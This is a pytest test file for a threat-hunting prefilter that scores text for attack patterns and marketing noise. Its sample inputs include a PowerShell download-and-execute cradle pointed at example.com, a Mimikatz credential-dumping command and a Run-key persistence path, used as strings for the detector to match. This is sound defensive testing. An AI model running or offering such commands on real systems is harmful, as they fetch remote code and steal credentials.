"""
Tests for the prefilter module.
"""

import pytest
from src.core.prefilter import prefilter_chunk, ChunkPrefilter


class TestPrefilter:
    """Test cases for the ChunkPrefilter class."""
    
    def test_prefilter_powershell_execution(self):
        """Test detection of PowerShell execution patterns."""
        text = "The attacker used PowerShell to execute malicious commands: Invoke-Expression 'IEX (New-Object Net.WebClient).DownloadString(\"http://example.com/payload\")'"
        
        result = prefilter_chunk(text)
        
        assert result['score'] > 0.0
        assert len(result['hits']) > 0
        
        # Check for PowerShell execution hit
        powershell_hits = [hit for hit in result['hits'] if hit['pattern_name'] == 'PowerShell Execution']
        assert len(powershell_hits) > 0
    
    def test_prefilter_credential_dumping(self):
        """Test detection of credential dumping patterns."""
        text = "The malware performed credential dumping using Mimikatz: sekurlsa::logonpasswords"
        
        result = prefilter_chunk(text)
        
        assert result['score'] > 0.0
        assert len(result['hits']) > 0
        
        # Check for credential dumping hit
        cred_hits = [hit for hit in result['hits'] if hit['pattern_name'] == 'Credential Dumping']
        assert len(cred_hits) > 0
    
    def test_prefilter_sigma_rules(self):
        """Test detection of Sigma rule patterns."""
        text = "Here's a Sigma rule for detecting the attack: title: Suspicious PowerShell Execution detection: selection: process.name: powershell.exe"
        
        result = prefilter_chunk(text)
        
        assert result['score'] > 0.0
        assert len(result['hits']) > 0
        
        # Check for Sigma rule hit
        sigma_hits = [hit for hit in result['hits'] if hit['pattern_name'] == 'Sigma Rules']
        assert len(sigma_hits) > 0
    
    def test_prefilter_noise_filtering(self):
        """Test noise pattern filtering."""
        text = "This is a blog post about cybersecurity. The company announced new security features. Please contact support for more information."
        
        result = prefilter_chunk(text)
        
        # Should have noise hits
        assert len(result['noise_hits']) > 0
        
        # Score should be lower due to noise
        assert result['score'] < 0.5
    
    def test_prefilter_technical_artifacts(self):
        """Test detection of technical artifacts."""
        text = "The attack involved process injection. The malware created process ID 1234 and accessed registry key HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        result = prefilter_chunk(text)
        
        assert result['score'] > 0.0
        assert len(result['hits']) > 0
        
        # Check for process artifacts
        process_hits = [hit for hit in result['hits'] if hit['pattern_name'] == 'Process Artifacts']
        assert len(process_hits) > 0
        
        # Check for registry artifacts
        registry_hits = [hit for hit in result['hits'] if hit['pattern_name'] == 'Registry Persistence']
        assert len(registry_hits) > 0
    
    def test_prefilter_multiple_patterns(self):
        """Test detection of multiple pattern types."""
        text = """The attacker used multiple techniques:
        1. PowerShell execution: Invoke-Expression "malicious_code"
        2. Process injection: CreateRemoteThread in explorer.exe
        3. Registry persistence: HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
        4. Network communication: 192.168.1.100:4444"""
        
        result = prefilter_chunk(text)
        
        assert result['score'] > 0.0
        assert len(result['hits']) >= 3  # Should detect multiple patterns
        
        # Check for different categories
        categories = set(hit['category'] for hit in result['hits'])
        assert len(categories) >= 2
    
    def test_prefilter_empty_text(self):
        """Test prefilter with empty text."""
        result = prefilter_chunk("")
        
        assert result['score'] == 0.0
        assert len(result['hits']) == 0
        assert len(result['noise_hits']) == 0
    
    def test_prefilter_low_quality_text(self):
        """Test prefilter with low-quality text."""
        text = "This is just a regular blog post about general topics. No technical content here."
        
        result = prefilter_chunk(text)
        
        assert result['score'] < 0.3  # Should have low score
        assert len(result['hits']) == 0 or result['score'] < 0.3
    
    def test_prefilter_high_quality_text(self):
        """Test prefilter with high-quality technical text."""
        text = """Technical Analysis of APT29 Attack:
        
        The attacker used sophisticated techniques including:
        - PowerShell execution with encoded commands
        - LSASS memory dumping for credential extraction
        - Registry persistence mechanisms
        - Network communication to C2 servers
        
        Detection Sigma Rule:
        title: APT29 PowerShell Execution
        detection:
          selection:
            process.name: powershell.exe
            process.command_line: "*Invoke-Expression*"
          condition: selection"""
        
        result = prefilter_chunk(text)
        
        assert result['score'] > 0.5  # Should have high score
        assert len(result['hits']) >= 3  # Should detect multiple patterns
    
    def test_prefilter_context_extraction(self):
        """Test that context is properly extracted around matches."""
        text = "The attacker used PowerShell to execute: Invoke-Expression 'malicious_code' and then performed process injection."
        
        result = prefilter_chunk(text)
        
        assert len(result['hits']) > 0
        
        for hit in result['hits']:
            assert 'context' in hit
            assert len(hit['context']) > 0
            
            # Check that context contains the match
            for context in hit['context']:
                assert 'match' in context
                assert 'context' in context
                assert context['match'] in context['context']
    
    def test_prefilter_hunting_guidance(self):
        """Test that hunting guidance is provided."""
        prefilter = ChunkPrefilter()
        
        text = "The attacker used Mimikatz for credential dumping: sekurlsa::logonpasswords"
        result = prefilter.prefilter_chunk(text)
        
        guidance = prefilter.get_hunting_guidance(result.hits)
        assert len(guidance) > 0
        
        # Check that guidance contains relevant information
        assert any("credential" in g.lower() for g in guidance)
    
    def test_prefilter_score_calculation(self):
        """Test score calculation logic."""
        text = "PowerShell execution: Invoke-Expression. Process injection: CreateRemoteThread. Registry persistence: HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        result = prefilter_chunk(text)
        
        # Score should be based on pattern weights and text length
        assert 0.0 <= result['score'] <= 1.0
        
        # More patterns should generally result in higher score
        high_quality_text = "PowerShell execution: Invoke-Expression. Process injection: CreateRemoteThread. Registry persistence: HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Credential dumping: Mimikatz. Network communication: 192.168.1.100:4444"
        high_result = prefilter_chunk(high_quality_text)
        
        assert high_result['score'] >= result['score']
    
    def test_prefilter_noise_threshold(self):
        """Test noise threshold filtering."""
        text = "This is a blog post about cybersecurity. The company announced new features. Please contact support. Thank you for reading this article."
        
        # Test with different noise thresholds
        result_low = prefilter_chunk(text, noise_threshold=0.1)
        result_high = prefilter_chunk(text, noise_threshold=0.5)
        
        # Higher threshold should result in lower or zero score
        assert result_high['score'] <= result_low['score']


if __name__ == "__main__":
    pytest.main([__file__])
